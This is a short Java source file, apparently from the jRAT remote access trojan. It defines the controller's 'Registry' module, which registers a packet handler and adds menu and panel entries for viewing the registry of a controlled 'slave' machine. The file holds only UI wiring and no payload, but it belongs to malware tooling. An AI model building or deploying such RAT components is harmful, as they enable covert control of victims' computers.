package jrat.module.registry;

import jrat.api.*;
import jrat.api.ui.ClientMenu;
import jrat.api.ui.ClientMenuItem;
import jrat.api.ui.ControlPanel;
import jrat.api.ui.ControlPanelTab;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.registry.ui.PanelRegistry;

public class RegistryControllerModule extends Module {

    public RegistryControllerModule() {
        super("Registry");
    }

    public void init() throws Exception {
        IncomingPackets.register((short) 54, PacketResult.class);

        ClientMenuItem item = new ClientMenuItem("Registry", Resources.getIcon("registry"), new ClientEventListener() {
            @Override
            public void emit(AbstractSlave slave) {
                new PanelRegistry((Slave) slave).displayFrame();
            }
        });

        ClientMenu.addItem(ClientMenu.Category.QUICK_OPEN, item);

        ControlPanelTab action = new ControlPanelTab(ControlPanel.Category.SYSTEM, "Registry", Resources.getIcon("registry"), PanelRegistry.class);

        ControlPanel.ITEMS.add(action);
    }

}
